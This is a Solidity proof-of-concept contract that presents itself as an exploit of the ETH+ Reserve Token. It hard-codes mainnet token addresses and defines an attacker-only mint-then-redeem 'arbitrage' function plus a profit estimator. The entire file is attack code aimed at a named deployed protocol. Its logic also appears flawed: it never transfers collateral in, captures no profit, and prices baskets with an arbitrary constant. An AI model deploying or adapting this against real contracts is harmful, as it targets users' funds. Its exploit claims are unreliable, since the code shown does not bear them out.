// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IRToken {
    function issue(uint256 amount) external;
    function redeem(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
    function basketsNeeded() external view returns (uint192);
    function totalSupply() external view returns (uint256);
}

interface IBasketHandler {
    function quote(uint192 amount, uint8 rounding) external view returns (address[] memory, uint256[] memory);
}

/**
 * POC CONTRACT FOR RESERVE PROTOCOL EXPLOIT
 *
 * This contract demonstrates the over-collateralized mint/redeem arbitrage attack
 * on the ETH+ Reserve Token (0xE72B141DF173b999AE7c1aDcbF60Cc9833Ce56a8)
 */
contract POC {
    address constant ETHplus = 0xE72B141DF173b999AE7c1aDcbF60Cc9833Ce56a8;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant rETH = 0xae78736Cd615f374D3085123A210448E74Fc6393;
    address constant sfrxETH = 0xac3E018457B222d93114458476f3E3416Abbe38F;
    address constant ETHx = 0xA35b1B31Ce002FBF2058D22F30f95D405200A15b;

    address public attacker;

    constructor() {
        attacker = msg.sender;
    }

    /**
     * @notice Executes the exploit by minting and immediately redeeming ETH+
     * @dev Assumes the caller has approved sufficient collateral tokens
     */
    function executeExploit() external {
        require(msg.sender == attacker, "Only attacker can execute");

        // Get collateral requirements for 1 ETH+
        (address[] memory tokens, uint256[] memory amounts) = getQuote(1e18);

        // Approve tokens (caller must have them)
        for (uint i = 0; i < tokens.length; i++) {
            IERC20(tokens[i]).approve(ETHplus, type(uint256).max);
        }

        // Mint 1 ETH+
        IRToken(ETHplus).issue(1e18);

        // Redeem 1 ETH+
        IRToken(ETHplus).redeem(1e18);
    }

    /**
     * @notice Gets the collateral quote for minting amount of ETH+
     */
    function getQuote(uint256 amount) public view returns (
        address[] memory tokens,
        uint256[] memory amounts
    ) {
        // Get basket handler address via main()
        (bool success, bytes memory data) = ETHplus.staticcall(
            abi.encodeWithSignature("main()")
        );
        require(success);

        address main = abi.decode(data, (address));

        (success, data) = main.staticcall(
            abi.encodeWithSignature("basketHandler()")
        );
        require(success);

        address basketHandler = abi.decode(data, (address));

        return IBasketHandler(basketHandler).quote(uint192(amount), 0);
    }

    /**
     * @notice Calculates the maximum possible profit from the exploit
     */
    function calculateMaxProfit() external view returns (
        uint256 excessBaskets,
        uint256 profitPercent,
        uint256 totalProfitValue
    ) {
        uint256 supply = IRToken(ETHplus).totalSupply();
        uint256 needed = uint256(IRToken(ETHplus).basketsNeeded());

        require(needed > supply, "Not over-collateralized");

        excessBaskets = needed - supply;
        profitPercent = (excessBaskets * 1e18) / supply;

        // Conservative basket value estimate (~$1800/basket)
        uint256 basketValue = 1800e18;
        totalProfitValue = (excessBaskets * basketValue) / 1e18;
    }
}